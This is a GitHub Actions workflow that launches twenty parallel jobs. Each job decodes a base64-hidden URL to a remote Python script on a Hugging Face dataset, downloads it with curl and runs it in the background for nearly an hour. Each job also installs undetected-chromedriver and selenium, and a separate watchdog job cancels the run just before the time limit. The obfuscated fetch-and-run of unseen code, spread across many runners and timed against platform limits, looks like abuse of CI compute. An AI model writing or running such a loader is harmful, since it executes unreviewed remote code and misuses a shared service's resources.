name: Apex Matrix Supervisor

on:
  workflow_dispatch:

concurrency:
  group: apex-session-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Job 1: الساعات الحارسة - إنهاء الجلسة تلقائياً بعد انقضاء الوقت
  # =================================================================
  lifetime-controller:
    name: "Lifetime Controller"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      HOLD_DURATION: 3540
    steps:
      - name: Arm Auto-Kill Switch
        run: |
          printf "[WATCHDOG] Armed for Workflow Run: %s\n" "${{ github.run_id }}"
          printf "[WATCHDOG] Holding thread active for %s seconds...\n" "${HOLD_DURATION}"

          sleep "${HOLD_DURATION}"

          printf "[WATCHDOG] Threshold reached. Issuing API termination request...\n"

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          printf "[WATCHDOG] Termination call sent successfully.\n"

  # =================================================================
  # Job 2: تشغيل المهام المتوازية على عقد التوزيع
  # =================================================================
  node-executor:
    name: "ExecutionNode-#${{ matrix.unit_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        unit_id: [v-1, v-2, v-3, v-4, v-5, v-6, v-7, v-8, v-9, v-0, v-1, v-2, v-3, v-4, v-5, v-6, v-7, v-8, v-9, 9920]

    steps:
      # -----------------------------------------------------------------
      # خطوة 1: تجهيز النظام المحلي وتنزيل السكريبت
      # -----------------------------------------------------------------
      - name: Prep Infrastructure & Fetch Script
        run: |
          echo "=== [STEP 1/3] Updating system repos & toolchain ==="
          sudo apt-get update -qq && sudo apt-get install -y --no-install-recommends curl python3-pip

          echo "=== [STEP 2/3] Fetching remote script ==="
          TARGET_URL=$(printf "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "${TARGET_URL}" -o main_service.py

      # -----------------------------------------------------------------
      # خطوة 2: تثبيت المكتبات البرمجية المطلوبة
      # -----------------------------------------------------------------
      - name: Install Python Dependencies
        run: |
          echo "=== [STEP 3/3] Installing requirements ==="
          python3 -m pip install -q --no-cache-dir undetected-chromedriver selenium requests psutil

      # -----------------------------------------------------------------
      # خطوة 3: إدارة تشغيل العملية في الخلفية وتحديد مدة بقائها
      # -----------------------------------------------------------------
      - name: Run Background Task with Timeout
        run: |
          echo ">>> Booting main_service.py on Unit #${{ matrix.unit_id }}..."

          python3 main_service.py &
          SERVICE_PID=$!

          echo ">>> Service launched with PID: ${SERVICE_PID}. Awaiting max duration (3540s)..."

          sleep 3540

          if ps -p "${SERVICE_PID}" > /dev/null 2>&1; then
            echo ">>> Max time limit reached. Force killing PID ${SERVICE_PID}..."
            kill -9 "${SERVICE_PID}"
            echo ">>> Process terminated."
          else
            echo ">>> Process exited on its own prior to timeout."
          fi
